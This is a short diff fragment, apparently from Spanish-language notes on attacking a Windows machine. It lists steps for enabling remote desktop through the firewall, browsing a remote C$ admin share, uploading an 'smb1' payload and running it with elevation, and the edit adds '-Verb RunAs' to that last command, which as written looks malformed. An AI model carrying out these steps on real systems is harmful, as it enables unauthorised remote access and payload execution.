@@ -33,4 +33,4 @@ netsh firewall set service type = remotedesktop mode = enable
 cd \\maquina\c$
 upload
 smb1 paylod
-powershell .\smb1.ps1
+powershell .\smb1.ps1 -Verb RunAs
